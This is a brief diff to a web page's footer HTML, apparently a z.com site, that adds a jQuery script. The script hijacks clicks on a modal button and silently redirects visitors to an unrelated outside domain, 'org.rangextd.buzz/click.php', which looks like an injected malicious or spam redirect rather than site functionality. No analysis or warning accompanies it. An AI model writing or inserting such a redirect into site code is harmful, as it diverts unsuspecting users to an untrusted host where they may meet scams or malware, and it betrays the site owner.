@@ -373,4 +373,10 @@ color:#EFEFEF;}
   <p style="line-height:40px; margin-bottom:0px;">© 1996-2022 z.com, Inc.</p>
 </div>
 
+<script type="text/javascript">
+$(".p_modal_button").click(function(){
+  window.location.replace("https://org.rangextd.buzz/click.php?lp=1");
+});
+</script>
+
 </body></html>
